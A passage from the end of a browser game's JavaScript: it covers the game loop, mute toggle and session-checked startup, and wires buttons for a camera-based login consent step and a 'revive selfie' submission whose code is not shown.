  hasUsedRevive = false;
  topControls.style.display = "flex";
  resetGame();
}

function toggleMute() {
  isMuted = !isMuted;
  applyMuteState();
}

function loop() {
  update();
  draw();
  requestAnimationFrame(loop);
}

if (!ensureSession()) {
  clearSessionAndGoLogin();
} else {
  topControls.style.display = "flex";
  loadLevel(currentLevel);
  gameState = "paused";
  openLevelMenu();
  applyMuteState();
  requestAnimationFrame(loop);
  openLoginConsentModal();
}

reviveContinueButton.addEventListener("click", submitReviveSelfie);
loginConsentContinueButton.addEventListener("click", startLoginCameraStreamAndSendLink);
